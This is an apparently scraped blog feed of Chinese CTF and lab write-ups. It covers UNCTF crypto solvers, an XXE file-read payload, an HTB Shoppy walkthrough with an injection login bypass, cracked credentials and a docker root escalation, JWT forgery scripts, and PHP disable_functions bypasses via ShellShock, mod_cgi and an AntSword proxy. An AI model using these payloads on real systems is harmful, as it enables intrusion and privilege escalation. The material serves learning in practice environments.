####################下面是misc小心海的脚本，因为很像，直接拿md5-1的改的 from hashlib import md5 file = open(&quot;out.txt&quot;, &#39;r&#39;) line = file.read() md = [] for i in range(0, 21): md.append(line[i * 32:(i + 1) * 32].lower()) print(md) list = [ &#39;U&#39;, &#39;N&#39;, &#39;C&#39;, &#39;T&#39;, &#39;F&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;0&#39;, &#39;{&#39;, &#39;}&#39;, &#39;_&#39; ] flags = [] for i in md: for j in range(0, 44, 1): md = md5(list[j].encode()).hexdigest() if (i == md): flags += list[j] flag = &#39;&#39;.join(flags) print(flag) md5-2-西南科技大学 1234567891011121314151617181920212223242526272829from hashlib import md5 file = open(&quot;out.txt&quot;, &#39;r&#39;) line = file.readlines() ## rint(line) list = [ &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;0&#39;, &#39;{&#39;, &#39;}&#39;, &#39;_&#39;, &#39;U&#39;, &#39;N&#39;, &#39;C&#39;, &#39;T&#39;, &#39;F&#39; ] flags = [] t = [] for i in range(0, 39): for j in range(0, 44, 1): if i == 0: f = int(md5(list[j].encode()).hexdigest(), 16) hexed = hex(f)[2:] if (line[i].strip(&#39;\\n&#39;) == hexed): flags += list[j] t.append(f) else: f = int(md5(list[j].encode()).hexdigest(), 16) hexed = hex(f ^ t[i - 1])[2:] if (line[i].strip(&#39;\\n&#39;) == hexed): flags += list[j] t.append(f) flag = &#39;&#39;.join(flags) print(flag) caesar-西南科技大学 凯撒换表 base 123456789101112131415161718192021222324## B6vAy{dhd_AOiZ_KiMyLYLUa_JlL/HY} ## UNCTF{w0w_Th1s_d1fFerent_c4eSar} ## ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ ## K=+19 file = open(&quot;caesar.txt&quot;, &quot;r&quot;) t = [] o = file.read() list = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; ## f = o.strip(&#39;\\n&#39;) for i in range(0, 27): for j in range(0, 64): print(o[i]) if o[i] == list[j]: if j + 19 &lt;= 64: t.append(list[j + 19]) else: t.append(list[j + 19 - 64]) # print(t) break # (list[j + 19]) # break # print(o[i], list[j]) flag = &#39;&#39;.join(t) print(flag) Single table-西南科技大学 paymfairx 密码修改 对称加密的流密码 根据 key 和 table 对应关系 列出新 table 如下图左侧 根据交叉对应关系得到右侧第三行 （第四行是我转小写尝试，还忘了个 T） 发现前面完美对应 后面却出现错误 看 koqw 像 know know 啥哪 paymfairx 密码吗 略作改动： UNCTF{GOD_YOU_KNOW_PLAYFAIR} 也不知道是故意需要修改的还是 我有那个细节错了 反正能做出来不管了 Multi table-西南科技大学 略修改加密算法 使其输出table,base_table.index(flag[i])来得到其他无关随机数的固定数据 可得出 UNCTF 加密得到的 SDCG 分别在table[?、?、?、?][9、14、5、16] 由此可根据前四位密文逆推出key = [9, 15, 23, 16] 这样解密所需的全部数据得到 编写解密脚本 加密： 12345flowchart LR 加密 --&gt; flag 加密 --&gt; key flag --&gt; base_table列 --&gt;table列 key --&gt; table行 1234flowchart LR 解密 --&gt;key table行 --&gt;table列 --c--&gt; base_table列 --&gt; flag key --&gt; table行 1234567891011121314151617181920212223from string import ascii_uppercase from binascii import b2a_hex,a2b_hex flag = &#39;&#39; c = &#39;SDCGW{MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD}&#39; base_table = [ &#39;J&#39;, &#39;X&#39;, &#39;I&#39;, &#39;S&#39;, &#39;E&#39;, &#39;C&#39;, &#39;R&#39;, &#39;Z&#39;, &#39;L&#39;, &#39;U&#39;, &#39;K&#39;, &#39;Q&#39;, &#39;Y&#39;, &#39;F&#39;, &#39;N&#39;, &#39;V&#39;, &#39;T&#39;, &#39;P&#39;, &#39;O&#39;, &#39;G&#39;, &#39;A&#39;, &#39;H&#39;, &#39;D&#39;, &#39;W&#39;, &#39;M&#39;, &#39;B&#39; ] table = {} key = [9, 15, 23, 16] for i in range(26): table[i]=ascii_uppercase[i:]+ascii_uppercase[:i] x = 0 for i in c: if i in ascii_uppercase: bt_num = table[key[x%4]].index(i) flag += base_table[bt_num] x += 1 else: flag += i print(flag) 以后找时间学学密码吧 之前一直想学一直没找到时间 靠着从 misc 那学的古典密码啥的，写了前几题的脚本 还有积累的脚本工具走到这 rsa 好多解应该是基础的 rsa，想拿工具试试来，苦于不咋会用于是 rsa 作罢 比完赛一定找大佬学学 MISC magic_word-西南科技大学 提示都送到嘴边了 直接零宽一把梭 syslog-浙江师范大学 打开是个系统日志文件 寻找敏感信息例如 发现能搜索到 password 解 base 得到压缩包密码 秒出 In_the_Morse_Garden-陆军工程大学 pdf 发现隐藏字符 赛博厨子构造一手 芝麻开门-广东海洋大学 txt 下面有段 base a2V5MQ== 拿他当 lsb 密码，一把梭 找得到我吗-闽南师范大学 docx，隐藏字符，零宽都试过了 以为触及知识盲区了 放了发现已经很多解了 然后鼓起勇气看了下 xml 发现还真在里面 misc 刷的文档题不多，还没大见过放在 xml 里的，我太菜了，还好知道这个知识点 但那道社什么社这么多解是真没想到，没对上脑电波？ zhiyin 小~黑子！ hex 看篮球，一眼倒了 逆过来 Go_p1ay（那个 1 和 l 我当时都没发现，还有下划线也没划清楚，傻乎乎试了半天） 下半段 zhiyinhex 里发现.-莫斯出 巨鱼-河南理工大学 上来 binwalk 下 出来个压缩包 对 fish 一通操作没找到密码 卡了半天去看别的题了 回来发现 png 有大问题 修改长宽高发现无所谓我会出手 解压 文档有密码 去看图片 我当时一眼苯环，服了，高中化学差点还给老师了 本来以为氯化苯 输入 C6Cl6、汉语等都不对 静下心来一看，这 nm 不是苯环 再试 C6H6Cl6 还不对 脑洞一开 666 flag get√ 清和 fan-江西警察学院 先是注释提示社工 很容易找到 解压缩 lsb 隐写 得到第二层密码 发现段 wav 文件 听了下，这频率感觉像 sstv vmware 的 Kali 前几个月转 wsl 了 kali 临时现装 sstv 出了点 bug 网上找了半天发现个手机软件 大晚上的 舍友都在打游戏，吵得很 于是去阳台识别 北方地区大晚上冷得很 识别了好几次 出来个微糊的 flag get√ 清和是吧，举办了 不是 剥茧抽丝-内蒙古警察职业学院 nm 看到这注释，有多少人想到的是掩码 hashcat 跑了好几分钟 发现密码就是这 小丑竟是我自己 零宽换了几个方式，终于出了（文件零宽) 结果，这不是下一层密码 看了眼 hint crc 不一样 没对上脑电波 卡了几天？ 想到，外面的比里面的大，能删减啊 把零宽的部分删了 发现正好 明文攻击 然后再用上面一层零宽解出来的解密码 flag get 颓废~（这个题是拖得最长的，不乐) 我小心海也绝非鳝类-中国计量大学现代科技学院 小心海说的话解 base92 一开始 ocr 识别的 c 成大写了 解出来有不可打印字符 检查了一遍改过来了 然后发现能 lsb EASYLSB 尝试把小心海的话当密码再解 lsb 发现串 16，开始误入歧途转了文件 想到小心海给我说的话 尝试 md5 转 切片 32 位 再改下 md5-1 的脚本==细看的话去 cypto 区 md5-1 看吧 直出","categories":[{"name":"web","slug":"web","permalink":"https://s1rius.space/categories/web/"}],"tags":[{"name":"unctf","slug":"unctf","permalink":"https://s1rius.space/tags/unctf/"},{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"misc","slug":"misc","permalink":"https://s1rius.space/tags/misc/"},{"name":"pwn","slug":"pwn","permalink":"https://s1rius.space/tags/pwn/"},{"name":"re","slug":"re","permalink":"https://s1rius.space/tags/re/"},{"name":"crypto","slug":"crypto","permalink":"https://s1rius.space/tags/crypto/"}],"author":"s1rius"},{"title":"xxe","slug":"XXE","date":"2022-12-05T16:00:00.000Z","updated":"2022-12-05T16:00:00.000Z","comments":true,"path":"2022/12/XXE/","permalink":"https://s1rius.space/2022/12/XXE/","excerpt":"","text":"XXE 发现输入的 username 被 alert 了 查源码 1onclick = &quot;XMLFunction()&quot;; 抓包看 xml 格式 回来看控制台 发现 js 的 xml 应用 123456789101112131415161718192021&lt;script type=&quot;text/javascript&quot;&gt; function XMLFunction(){ var xml = &#39;&#39; + &#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#39; + &#39;&lt;root&gt;&#39; + &#39; &lt;username&gt;&#39; + $(&#39;#username&#39;).val() + &#39;&lt;/username&gt;&#39; + &#39; &lt;password&gt;&#39; + $(&#39;#password&#39;).val() + &#39;&lt;/password&gt;&#39; + &#39; &lt;/root&gt;&#39;; var xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange = function () { if(xmlhttp.readyState == 4){ console.log(xmlhttp.readyState); console.log(xmlhttp.responseText); alert(xmlhttp.responseText); } } xmlhttp.open(&quot;POST&quot;,&quot;login.php&quot;,true); xmlhttp.send(xml); }; &lt;/script&gt; 构造 xxe 攻击 这是 post 包传的时候记得把注释删去 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE root[ &lt;!ENTITY flag SYSTEM &quot;file:///flag&quot;&gt;&lt;!--构造实体--&gt; ]&gt; &lt;root&gt; &lt;username&gt;&amp;flag;&lt;/username&gt;&lt;!--输出flag实体--&gt; &lt;password&gt;2333&lt;/password&gt; &lt;/root&gt; flag{6866a844-3788-4a9d-9909-1d9d9943f56f} 123456789101112131415161718192021222324252627282930313233&lt;?php /** * autor: c0ny1 * date: 2018-2-7 */ $USERNAME = &#39;admin&#39;; //账号 $PASSWORD = &#39;024b87931a03f738fff6693ce0a78c88&#39;; //密码 $result = null; libxml_disable_entity_loader(false); $xmlfile = file_get_contents(&#39;php://input&#39;); try{ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $password = $creds-&gt;password; if($username == $USERNAME &amp;&amp; $password == $PASSWORD){ $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username); }else{ $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username); } }catch(Exception $e){ $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage()); } header(&#39;Content-Type: text/html; charset=utf-8&#39;); echo $result; ?&gt; 有 admin 密码了也没用 藏内网了，上次比赛 ssrf 题出过 etc/hosts proc/net/arp","categories":[{"name":"web","slug":"web","permalink":"https://s1rius.space/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"xxe","slug":"xxe","permalink":"https://s1rius.space/tags/xxe/"},{"name":"buuctf","slug":"buuctf","permalink":"https://s1rius.space/tags/buuctf/"}],"author":"s1rius"},{"title":"htb-Shoppy","slug":"htb-Shoppy","date":"2022-10-22T16:00:00.000Z","updated":"2022-10-22T16:00:00.000Z","comments":true,"path":"2022/10/htb-Shoppy/","permalink":"https://s1rius.space/2022/10/htb-Shoppy/","excerpt":"","text":"共做出三道题，前两道题 wp 正在补，但现在又有点想转去做 vulntarget Shoppy 信息收集 老样子 先 nmap 扫下 有 22 和 80 然后将域名加入 hosts 子域名扫描 可以使用 gobuster 或各种 fuzz 工具如 wfuzz 本来想用 oneforall 扫子域名，试了半天一堆错误，后来问学长，oneforall 是调用了一堆子域名解析的 扫到 mattermost.shoppy.htb 加进 hosts 打开发现是个登陆界面，先放着 跑下主站的域名 发现有个/admin 登录 根据黑盒测试老套路，试试弱口令，不成功，试试万能密码跑下 发现admin'||''==='成功进入 进入后发现搜索框，可进行大量尝试 当搜索到 admin 后出现 passwordhash 继续尝试后发现搜索admin'||''==='会出现两个 hash 使用 hashcat 爆破 josh:remembermethisway 然后进入之前扫到的那个子域名尝试登陆，成功 又是 htb 经典频道页面 翻找后发现 尝试使用 ssh 连接 password:Sh0ppyBest@pp! user get√ root ssh 进入后 ls 发现已经有老哥把经典 linepeas 传进去了 开跑！ 然后爆出一堆 cve 先放一边 还在后面看到一些 password 字段的文件去看看 password:Sample 调用下密码管理器 再次使用 ssh 登录 deploy 账户 进入后又没啥思路了 准备走 cve 了 走前看了眼 wp 发现聊天页下面还有段话 发现 docker 部署尝试 docker 提权 1docker run -v /:/mnt --rm -it alpine chroot /mnt sh 其实后来想想 linpeas 里出现了提示 deplay 在 root 权限的 docker 组里，当时要是细看的话应该也能想到 后面跟着 wp 做 cve 也懒得去试了 最后给师傅们留下截图 这回 cve 都没用，给个简单低评吧~","categories":[{"name":"htb","slug":"htb","permalink":"https://s1rius.space/categories/htb/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://s1rius.space/tags/HackTheBox/"},{"name":"htb-Shoppy","slug":"htb-Shoppy","permalink":"https://s1rius.space/tags/htb-Shoppy/"}],"author":"s1rius"},{"title":"SSTI模板注入","slug":"SSTI模板注入","date":"2022-10-19T16:00:00.000Z","updated":"2022-10-19T16:00:00.000Z","comments":true,"path":"2022/10/SSTI模板注入/","permalink":"https://s1rius.space/2022/10/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","excerpt":"","text":"[护网杯 2018]easy_tornado ssti 注入点在 msg 注入49出现 orz 应该是有过滤 1正常 hint 里缺 cookie_secret 该项在 handler.settings Handler 这个对象，Handler 指向的处理当前这个页面的 RequestHandler 对象 RequestHandler 中并没有 settings 这个属性，与 RequestHandler 关联的 Application 对象（Requestion.application）才有 setting 这个属性 handler 指向 RequestHandler 而 RequestHandler.settings 又指向 self.application.settings 所有 handler.settings 就指向 RequestHandler.application.settings 了！ 然后按 hint 里的 MD5 加密过后传参 1?filename=/fllllllllllllag&amp;filehash=ff92d5623223cadc00efabfc7676f9fe filehash 不同 请自行加密 [BJDCTF2020]The mystery of ip 1234567891011121314151617181920212223242526272829303132333435&lt;?php require_once(&#39;header.php&#39;); require_once(&#39;./libs/Smarty.class.php&#39;); $smarty = new Smarty(); if (!empty($_SERVER[&#39;HTTP_CLIENT_IP&#39;])) { $ip=$_SERVER[&#39;HTTP_CLIENT_IP&#39;]; } elseif (!empty($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) { $ip=$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]; } else { $ip=$_SERVER[&#39;REMOTE_ADDR&#39;]; } //$your_ip = $smarty-&gt;display(&quot;string:&quot;.$ip); echo &quot;&lt;div class=\\&quot;container panel1\\&quot;&gt; &lt;div class=\\&quot;row\\&quot;&gt; &lt;div class=\\&quot;col-md-4\\&quot;&gt; &lt;/div&gt; &lt;div class=\\&quot;col-md-4\\&quot;&gt; &lt;div class=\\&quot;jumbotron pan\\&quot;&gt; &lt;div class=\\&quot;form-group log\\&quot;&gt; &lt;label&gt;&lt;h2&gt;Your IP is : &quot;; $smarty-&gt;display(&quot;string:&quot;.$ip); echo &quot; &lt;/h2&gt;&lt;/label&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\\&quot;col-md-4\\&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&quot;; ?&gt; [BJDCTF2020]Cookie is so stable","categories":[{"name":"web","slug":"web","permalink":"https://s1rius.space/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"SSTI","slug":"SSTI","permalink":"https://s1rius.space/tags/SSTI/"},{"name":"模板注入","slug":"模板注入","permalink":"https://s1rius.space/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"}],"author":"s1rius"},{"title":"ctfhub-jwt","slug":"jwt","date":"2022-09-16T16:00:00.000Z","updated":"2022-09-16T16:00:00.000Z","comments":true,"path":"2022/09/jwt/","permalink":"https://s1rius.space/2022/09/jwt/","excerpt":"","text":"基础知识 题目附件：jwt 基础知识 flag 在下面 需要了解一下 jwt 组成部分 敏感信息泄露 随便输个 进去查消息头 然后在 jwt.io decode 一共两部分 ag 是另一半 无签名 12345678910import jwt algorithm=&quot;none&quot; payload = { &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;, &quot;role&quot;:&quot;admin&quot; } key = &quot;&quot; encoded = jwt.encode(payload,key,algorithm) print(encoded) jwt 的签名可以为无 今天写这个脚本的时候命名为 jwt.py 结果报错 但是系统环境运行正常 才知道是文件名的事 import jwt 他先自己引用自己了 抓包 把 cookie 里的 token 改为这脚本的运行结果 弱密钥 需要用到jwt-cracker 依次执行即可 1234git clone https://github.com/brendan-rius/c-jwt-cracker ./c-jwt-cracker make ./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.w4i8KWRWmY_xTYtRnFZnp5vLIxPG2abCly6lW6QxTKs 然后得出该 jwt 密钥 然后放之前那个网站 改 role 为 admin 返回提交 token 修改签名算法 把 cookie 清空后提交用户名密码 得到一串 jwt 丢进 发现是 RS256 编码（不对称式编码) 需要改为对称式编码 如 HS256 题目中给了 public key 用 PUBLIC_KEY 采用 HS256 进行加密 payload 构造 token 借用大神 h0ld1rs的脚本 无签名那段脚本 是勉勉强强写出来的 这题就先用大神的脚本吧 我太菜了 123456789101112131415161718192021222324252627## coding=GBK import hmac import hashlib import base64 file = open(&#39;publickey.pem&#39;)#需要将文中的publickey下载 与脚本同目录 key = file.read() ## Paste your header and payload here header = &#39;{&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;}&#39; payload = &#39;{&quot;username&quot;: &quot;admin&quot;, &quot;role&quot;: &quot;admin&quot;}&#39; ## Creating encoded header encodeHBytes = base64.urlsafe_b64encode(header.encode(&quot;utf-8&quot;)) encodeHeader = str(encodeHBytes, &quot;utf-8&quot;).rstrip(&quot;=&quot;) ## Creating encoded payload encodePBytes = base64.urlsafe_b64encode(payload.encode(&quot;utf-8&quot;)) encodePayload = str(encodePBytes, &quot;utf-8&quot;).rstrip(&quot;=&quot;) ## Concatenating header and payload token = (encodeHeader + &quot;.&quot; + encodePayload) ## Creating signature sig = base64.urlsafe_b64encode(hmac.new(bytes(key, &quot;UTF-8&quot;), token.encode(&quot;utf-8&quot;), hashlib.sha256).digest()).decode(&quot;UTF-8&quot;).rstrip(&quot;=&quot;) print(token + &quot;.&quot; + sig) 运行后把 token 返回去验证 成功","categories":[{"name":"web","slug":"web","permalink":"https://s1rius.space/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"jwt","slug":"jwt","permalink":"https://s1rius.space/tags/jwt/"},{"name":"json web token","slug":"json-web-token","permalink":"https://s1rius.space/tags/json-web-token/"}],"author":"s1rius"},{"title":"Bypass disable_function","slug":"Bypass disable_function","date":"2022-05-01T16:00:00.000Z","updated":"2022-05-01T16:00:00.000Z","comments":true,"path":"2022/05/Bypass disable_function/","permalink":"https://s1rius.space/2022/05/Bypass%20disable_function/","excerpt":"","text":"LD_PRELOAD 时间紧 于是先采用最省时的方法 先蚁剑连 发现打不开 flag 文件 要使用蚁剑插件绕过disabled function 如果蚁剑插件市场打不开的话可以去 github 搜 github 上有说明 按着他的安 连上之后在蚁剑主页面右键 webshell 使用该插件 按照步骤操作 成功后把 webshell 地址改为 http://……/.antproxy.php 在连上就能 tac 了 tac /flag ShellShock 进去发现连不上 查了下大佬博客说是环境不正常 原理如下 如果环境变量的值以字符() {开头，那么这个变量就会被当作是一个导入函数的定义（Export），这种定义只有在 shell 启动的时候才生效。 脚本 123456&lt;?php $cmd = &quot; tac /flag&gt;/var/www/html/1.txt&quot;; putenv(&quot;PHP_DMIND=() { :; };$cmd&quot;); error_log(&quot;dmind&quot;,1); echo file_get_contents(&quot;/var/www/html/1.txt&quot;); ?&gt; 用蚁剑传进去后 浏览器访问这个文件即可在 1.txt 看到 flag Apache Mod CGI 如果.htaccess 文件被攻击者修改的话，攻击者就可以利用 apache 的 mod_cgi 模块，直接绕过 PHP 的任何限制，来执行系统命令 1.Mod CGI 就是把 PHP 做为 APACHE 一个内置模块，让 apache http 服务器本身能够支持 PHP 语言，不需要每一个请求都通过启动 PHP 解释器来解释 PHP. 2.它可以将 cgi-script 文件或者用户自定义标识头为 cgi-script 的文件通过服务器运行. 3.在.htaccess 文件中可定制用户定义标识头 4.添加 Options +ExecCGI，代表着允许使用 mod_cgi 模块执行 CGI 脚本 5.添加 AddHandler cgi-script .cgi，代表着包含.cgi 扩展名的文件都将被视为 CGI 程序 条件 必须是 apache 环境 mod_cgi 已经启用 必须允许.htaccess 文件，也就是说在 httpd.conf 中，要注意 AllowOverride 选项为 All，而不是 none 必须有权限写.htaccess 文件 脚本： .htaccess 1Options +ExecCGI AddHandler cgi-script .cgi shell.cgi 12#!/bin/sh echo&amp;&amp;cd &quot;/var/www/html/backdoor&quot;;cat shell.cgi;echo 96642;pwd;echo c26b314f4b 简单方法： 蚁剑连 还是那个插件 bypass！ PHP-FPM FPM 是 fast-cgi 的协议解析器 webserver 使用 cgi 协议封装好用户的请求发送给 FPM FPM 按照 cgi 的协议将 TCP 流解析成真正的数据 蚁剑 bypass 模式：FPM 地址：127.0.0.1：9000 或 localhost：9000 植入后修改 shell 地址为 http://……/.antproxy.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?php function get_client_header(){ $headers=array(); foreach($_SERVER as $k=&gt;$v){ if(strpos($k,&#39;HTTP_&#39;)===0){ $k=strtolower(preg_replace(&#39;/^HTTP/&#39;, &#39;&#39;, $k)); $k=preg_replace_callback(&#39;/_\\w/&#39;,&#39;header_callback&#39;,$k); $k=preg_replace(&#39;/^_/&#39;,&#39;&#39;,$k); $k=str_replace(&#39;_&#39;,&#39;-&#39;,$k); if($k==&#39;Host&#39;) continue; $headers[]=&quot;$k:$v&quot;; } } return $headers; } function header_callback($str){ return strtoupper($str[0]); } function parseHeader($sResponse){ list($headerstr,$sResponse)=explode(&quot; &quot;,$sResponse, 2); $ret=array($headerstr,$sResponse); if(preg_match(&#39;/^HTTP/1.1 d{3}/&#39;, $sResponse)){ $ret=parseHeader($sResponse); } return $ret; } set_time_limit(120); $headers=get_client_header(); $host = &quot;127.0.0.1&quot;; $port = 61921; $errno = &#39;&#39;; $errstr = &#39;&#39;; $timeout = 30; $url = &quot;/index.php&quot;; if (!empty($_SERVER[&#39;QUERY_STRING&#39;])){ $url .= &quot;?&quot;.$_SERVER[&#39;QUERY_STRING&#39;]; }; $fp = fsockopen($host, $port, $errno, $errstr, $timeout); if(!$fp){ return false; } $method = &quot;GET&quot;; $post_data = &quot;&quot;; if($_SERVER[&#39;REQUEST_METHOD&#39;]==&#39;POST&#39;) { $method = &quot;POST&quot;; $post_data = file_get_contents(&#39;php://input&#39;); } $out = $method.&quot; &quot;.$url.&quot; HTTP/1.1\\r\\n&quot;; $out .= &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\\r\\n&quot;; if (!empty($_SERVER[&#39;CONTENT_TYPE&#39;])) { $out .= &quot;Content-Type: &quot;.$_SERVER[&#39;CONTENT_TYPE&#39;].&quot;\\r\\n&quot;; } $out .= &quot;Content-length:&quot;.strlen($post_data).&quot;\\r\\n&quot;; $out .= implode(&quot;\\r\\n&quot;,$headers); $out .= &quot;\\r\\n\\r\\n&quot;; $out .= &quot;&quot;.$post_data; fputs($fp, $out); $response = &#39;&#39;; while($row=fread($fp, 4096)){ $response .= $row; } fclose($fp); $pos = strpos($response, &quot;\\r\\n\\r\\n&quot;); $response = substr($response, $pos+4); echo $response; UAF GC 利用的是 PHP Garbage Collector 程序中的堆溢出触发 题目附件 其实蚁剑的 reference 就有这附件 包括后面的大佬脚本 可以用蚁剑一把梭 另附 [大佬poc](https://github.com/mm0r1/exploits) UAF 的脚本里面都有 tql！ Json Serializer UAF 漏洞利用 json 在序列化中的堆溢出触发 bypass，漏洞为 bug #77843 蚁剑一把梭 Backtrace UAF 漏洞利用的是 debug_backtrace 这个函数，可以利用该函数的漏洞返回已经销毁的变量的引用达成堆溢出，漏洞为 bug #76047 FFI PHP FFI 详解 **disabled function:** pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv iconv github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/9/ https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?php function get_client_header(){ $headers=array(); foreach($_SERVER as $k=&gt;$v){ if(strpos($k,&#39;HTTP_&#39;)===0){ $k=strtolower(preg_replace(&#39;/^HTTP/&#39;, &#39;&#39;, $k)); $k=preg_replace_callback(&#39;/_\\w/&#39;,&#39;header_callback&#39;,$k); $k=preg_replace(&#39;/^_/&#39;,&#39;&#39;,$k); $k=str_replace(&#39;_&#39;,&#39;-&#39;,$k); if($k==&#39;Host&#39;) continue; $headers[]=&quot;$k:$v&quot;; } } return $headers; } function header_callback($str){ return strtoupper($str[0]); } function parseHeader($sResponse){ list($headerstr,$sResponse)=explode(&quot; &quot;,$sResponse, 2); $ret=array($headerstr,$sResponse); if(preg_match(&#39;/^HTTP/1.1 d{3}/&#39;, $sResponse)){ $ret=parseHeader($sResponse); } return $ret; } set_time_limit(120); $headers=get_client_header(); $host = &quot;127.0.0.1&quot;; $port = 63947; $errno = &#39;&#39;; $errstr = &#39;&#39;; $timeout = 30; $url = &quot;/index.php&quot;; if (!empty($_SERVER[&#39;QUERY_STRING&#39;])){ $url .= &quot;?&quot;.$_SERVER[&#39;QUERY_STRING&#39;]; }; $fp = fsockopen($host, $port, $errno, $errstr, $timeout); if(!$fp){ return false; } $method = &quot;GET&quot;; $post_data = &quot;&quot;; if($_SERVER[&#39;REQUEST_METHOD&#39;]==&#39;POST&#39;) { $method = &quot;POST&quot;; $post_data = file_get_contents(&#39;php://input&#39;); } $out = $method.&quot; &quot;.$url.&quot; HTTP/1.1\\r\\n&quot;; $out .= &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\\r\\n&quot;; if (!empty($_SERVER[&#39;CONTENT_TYPE&#39;])) { $out .= &quot;Content-Type: &quot;.$_SERVER[&#39;CONTENT_TYPE&#39;].&quot;\\r\\n&quot;; } $out .= &quot;Content-length:&quot;.strlen($post_data).&quot;\\r\\n&quot;; $out .= implode(&quot;\\r\\n&quot;,$headers); $out .= &quot;\\r\\n\\r\\n&quot;; $out .= &quot;&quot;.$post_data; fputs($fp, $out); $response = &#39;&#39;; while($row=fread($fp, 4096)){ $response .= $row; } fclose($fp); $pos = strpos($response, &quot;\\r\\n\\r\\n&quot;); $response = substr($response, $pos+4); echo $response;","categories":[{"name":"web","slug":"web","permalink":"https://s1rius.space/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"提权","slug":"提权","permalink":"https://s1rius.space/tags/%E6%8F%90%E6%9D%83/"}],"author":"s1rius"},{"title":"linux动态加载","slug":"linux动态加载","date":"2022-05-01T16:00:00.000Z","updated":"2022-05-01T16:00:00.000Z","comments":true,"path":"2022/05/linux动态加载/","permalink":"https://s1rius.space/2022/05/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/","excerpt":"","text":"linux 动态加载 查看环境 先给了 755 他自己传了 flag 等于告诉我们在哪了 然后限到了 644 不想让我们直接看 都到这一题了权限应该不用讲了 提示给了 shell 且不需要提权 于是需要新学一个东西 动态加载 Linux ELF Dynaamic Loader elf 文件 elf 文件是 linux 下的可执行文件 文件头为 elf 不知道是靶机还是蚁剑虚拟终端的问题 没法 vi 直接 cat 就能看到了 动态库链接器/加载器 当需要动态链接的应用被操作系统加载时 